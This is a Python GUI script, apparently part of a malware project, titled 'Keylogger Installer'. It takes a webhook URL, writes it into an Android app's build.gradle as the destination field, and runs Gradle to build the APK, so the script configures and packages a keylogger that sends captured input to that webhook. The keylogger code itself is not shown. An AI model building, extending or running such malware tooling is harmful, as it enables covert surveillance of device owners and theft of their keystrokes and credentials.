import subprocess
import os
import threading
import ttkbootstrap as ttk
import platform
import re

def install():
    thread = threading.Thread(target=run_build_process)
    thread.start()

def run_build_process():
    webhook_url = entry.get().strip()
    
    # Validación de la URL del webhook
    if not webhook_url:
        status_label.config(text="⚠️ Error: URL del webhook no puede estar vacía", foreground="orange")
        return
    
    if not webhook_url.startswith(("https://")):
        status_label.config(text="⚠️ Error: La URL debe comenzar con https://", foreground="orange")
        return
    
    if not re.match(r'^https?://[a-zA-Z0-9][\w\-.~:/?#[\]@!$&\'()*+,;=]*$', webhook_url):
        status_label.config(text="⚠️ Error: La URL contiene caracteres no permitidos", foreground="orange")
        return
    
    # Sanitizar URL para evitar inyección en el código Java
    webhook_url = webhook_url.replace('"', '\\"')
    
    try:
        # Modificar el archivo build.gradle para incluir la URL del webhook
        gradle_file_path = "app/build.gradle"
        with open(gradle_file_path, "r") as file:
            build_gradle_content = file.readlines()

        # Actualizar el campo buildConfigField con la URL del webhook
        for i, line in enumerate(build_gradle_content):
            if 'buildConfigField "String", "WEBHOOK_URL"' in line:
                build_gradle_content[i] = f'        buildConfigField "String", "WEBHOOK_URL", "\\"{webhook_url}\\""\n'
                break

        with open(gradle_file_path, "w") as file:
            file.writelines(build_gradle_content)

        status_label.config(text="Building APK...", foreground="yellow")
        progress_bar.start(10)

        is_windows = platform.system() == "Windows"
        gradle_file = "gradlew.bat" if is_windows else "./gradlew"
        
        if not is_windows:
            subprocess.run(["chmod", "+x", "./gradlew"])

        result = subprocess.run(
            [gradle_file, "assembleDebug"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=os.getcwd()
        )

        progress_bar.stop()
        print("Gradle STDOUT:\n", result.stdout)
        print("Gradle STDERR:\n", result.stderr)
        if result.returncode == 0:
            status_label.config(text="✅ APK built successfully!", foreground="green")
            open_apk_folder()
        else:
            status_label.config(text="❌ APK build failed!", foreground="red")

    except Exception as e:
        progress_bar.stop()
        status_label.config(text=f"⚠️ Error: {e}", foreground="orange")

def open_apk_folder():
    apk_path = os.path.join(os.getcwd(), "app", "build", "outputs", "apk", "debug")
    if platform.system() == "Windows":
        subprocess.Popen(["explorer", apk_path])
    else:
        subprocess.Popen(["xdg-open", apk_path])

root = ttk.Window(themename="darkly")
root.title("Keylogger Installer")
root.geometry("500x250")
root.resizable(False, False)

ttk.Label(root, text="🔷 Keylogger Installer", font=("Arial", 16, "bold")).pack(pady=10)

frame = ttk.Frame(root)
frame.pack(pady=5)

ttk.Label(frame, text="Enter Webhook URL:", font=("Arial", 12)).grid(row=0, column=0, padx=5)
entry = ttk.Entry(frame, width=40)
entry.grid(row=0, column=1, padx=5)

build_button = ttk.Button(root, text="🔨 Build APK", bootstyle="primary", command=install)
build_button.pack(pady=10)

progress_bar = ttk.Progressbar(root, mode="indeterminate", bootstyle="info")
progress_bar.pack(fill="x", padx=20, pady=5)

status_label = ttk.Label(root, text="", font=("Arial", 10))
status_label.pack(pady=5)

root.mainloop()
